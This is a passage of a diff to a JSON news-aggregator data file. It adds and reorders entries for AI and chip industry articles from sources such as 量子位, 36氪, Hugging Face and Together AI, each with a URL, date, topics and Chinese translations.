+      "title": "DeepSeek带火稀疏计算，国产芯片公司加速突围：这家公司又融近10亿",
+      "url": "https://news.google.com/rss/articles/CBMiVEFVX3lxTE9wd0ljdERfRDdadUFhR3R5alh5OWZiOXNjQjZ0ZUZjVm5jSkJQYnhlaDdCSm13VVFORXV2dlNRM2hrNzlvVElvNkJabHRtRlVTSEhYYQ?oc=5",
+      "source_id": "qbitai",
+      "source_name": "量子位",
+      "source_home": "https://www.qbitai.com",
+      "published": "2026-11-06T15:00:29+08:00",
+      "excerpt": "",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": []
     },
     {
       "id": "d34679e8bc5f8390",
@@ -29557,6 +31392,23 @@
       "types": []
     },
     {
+      "id": "aca40f7b8635769b",
+      "title": "OpenAI掀翻计算机科学30年基石，还解决了挂谷猜想",
+      "url": "https://news.google.com/rss/articles/CBMiTkFVX3lxTE80RkQ1bjVXemQzdUg3THhIeFB2VFF0dlRQdVlHUW15Uk55TURGSXViel84S2NXRnptR3BXbWJFU1AzZERTQThsbTZDRG1MZw?oc=5",
+      "source_id": "36kr",
+      "source_name": "36氪",
+      "source_home": "https://www.36kr.com",
+      "published": "2026-10-27T15:00:00+08:00",
+      "excerpt": "",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "science"
+      ],
+      "types": []
+    },
+    {
       "id": "a3a879144b2984ac",
       "title": "OpenAI expands partnership with Oracle to bring its apps to ChatGPT",
       "url": "https://openai.com/index/oracle-apps-in-chatgpt",
@@ -29578,23 +31430,6 @@
       ],
       "title_zh": "OpenAI 扩大与 Oracle 的合作伙伴关系，将其应用程序引入 ChatGPT",
       "excerpt_zh": "OpenAI 和 Oracle 正在扩大合作伙伴关系，将业务应用程序和 AI 代理引入 ChatGPT 并为新的 Oracle 产品提供支持。"
-    },
-    {
-      "id": "aca40f7b8635769b",
-      "title": "OpenAI掀翻计算机科学30年基石，还解决了挂谷猜想",
-      "url": "https://news.google.com/rss/articles/CBMiTkFVX3lxTE80RkQ1bjVXemQzdUg3THhIeFB2VFF0dlRQdVlHUW15Uk55TURGSXViel84S2NXRnptR3BXbWJFU1AzZERTQThsbTZDRG1MZw?oc=5",
-      "source_id": "36kr",
-      "source_name": "36氪",
-      "source_home": "https://www.36kr.com",
-      "published": "2026-10-27T15:00:00+08:00",
-      "excerpt": "",
-      "lang": "zh",
-      "region": "cn",
-      "models": [],
-      "topics": [
-        "science"
-      ],
-      "types": []
     },
     {
       "id": "26c5fcb884712658",
@@ -32796,24 +34631,6 @@
       "excerpt_zh": "本白皮书解释了边缘人工智能和物理人工智能如何帮助城市超越被动监控。它展示了城市基础设施如何感知、推理并根据公共安全、交通等实时条件采取行动"
     },
     {
-      "id": "9dbc0d55ff9123c6",
-      "title": "TorchNeuron: running HF models on AWS Trainium is easier than ever",
-      "url": "https://huggingface.co/blog/hf-torchneuron",
-      "source_id": "huggingface",
-      "source_name": "Hugging Face",
-      "source_home": "https://huggingface.co/blog",
-      "published": "2026-10-19T08:00:00+08:00",
-      "excerpt": "",
-      "lang": "en",
-      "region": "intl",
-      "models": [],
-      "topics": [],
-      "types": [
-        "opensource"
-      ],
-      "title_zh": "TorchNeuron：在 AWS Trainium 上运行 HF 模型比以往更容易"
-    },
-    {
       "id": "ff29f2e74f0b217c",
       "title": "Together Post-Training: frontier-grade model shaping, the way that fits you",
       "url": "https://together.ai/blog/together-post-training",
@@ -32832,6 +34649,24 @@
       "types": [],
       "title_zh": "培训后一起：前沿级模型塑造，适合您的方式",
       "excerpt_zh": "使用 SFT 或 RL 将 Qwen、GLM 和 Kimi 等开放式 LLM 训练成您拥有的自定义模型。您编写训练循环。共同运行硬基础设施。"
+    },
+    {
+      "id": "9dbc0d55ff9123c6",
+      "title": "TorchNeuron: running HF models on AWS Trainium is easier than ever",
+      "url": "https://huggingface.co/blog/hf-torchneuron",
+      "source_id": "huggingface",
+      "source_name": "Hugging Face",
+      "source_home": "https://huggingface.co/blog",
+      "published": "2026-10-19T08:00:00+08:00",
+      "excerpt": "",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "opensource"
+      ],
+      "title_zh": "TorchNeuron：在 AWS Trainium 上运行 HF 模型比以往更容易"
     },
     {
       "id": "66d5720ec836838d",
@@ -33727,6 +35562,28 @@
       "excerpt_zh": "多模式代理通常在每个动作之前生成自由形式的推理。对于小型模型，有限的模型容量可能会导致冗长的推理，几乎无法为动作生成提供有用的指导，而"
     },
     {
+      "id": "e91685213861b0f8",
+      "title": "Meta Muse Spark Open is live on Together AI",
+      "url": "https://together.ai/blog/meta-muse-spark-open",
+      "source_id": "together",
+      "source_name": "Together AI",
+      "source_home": "https://www.together.ai/blog",
+      "published": "2026-10-15T08:00:00+08:00",
+      "excerpt": "Meta Muse Spark Open, Meta's open-weight model for agentic coding, is live on Together AI with a 1M-token context window on serverless and dedicated infrastructure.",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "coding",
+        "agent"
+      ],
+      "types": [
+        "opensource"
+      ],
+      "title_zh": "Meta Muse Spark Open 在 Together AI 上上线",
+      "excerpt_zh": "Meta Muse Spark Open 是 Meta 用于代理编码的开放权重模型，已在 Together AI 上运行，并在无服务器和专用基础设施上拥有 1M 代币上下文窗口。"
+    },
+    {
       "id": "9d251ac6836a600d",
       "title": "Welcome Muse Spark Open: open-weight frontier multimodal mixture-of-experts model from Meta",
       "url": "https://huggingface.co/blog/meta-muse-spark-open",
@@ -33767,28 +35624,6 @@
         "opensource"
       ],
       "title_zh": "欢迎 FLUX.3 扩散器中的 Klein 图像"
-    },
-    {
-      "id": "e91685213861b0f8",
-      "title": "Meta Muse Spark Open is live on Together AI",
-      "url": "https://together.ai/blog/meta-muse-spark-open",
-      "source_id": "together",
-      "source_name": "Together AI",
-      "source_home": "https://www.together.ai/blog",
-      "published": "2026-10-15T08:00:00+08:00",
-      "excerpt": "Meta Muse Spark Open, Meta's open-weight model for agentic coding, is live on Together AI with a 1M-token context window on serverless and dedicated infrastructure.",
-      "lang": "en",
-      "region": "intl",
-      "models": [],
-      "topics": [
-        "coding",
-        "agent"
-      ],
-      "types": [
-        "opensource"
-      ],
-      "title_zh": "Meta Muse Spark Open 在 Together AI 上上线",
-      "excerpt_zh": "Meta Muse Spark Open 是 Meta 用于代理编码的开放权重模型，已在 Together AI 上运行，并在无服务器和专用基础设施上拥有 1M 代币上下文窗口。"
     },
     {
       "id": "dd00c04c9b95848e",
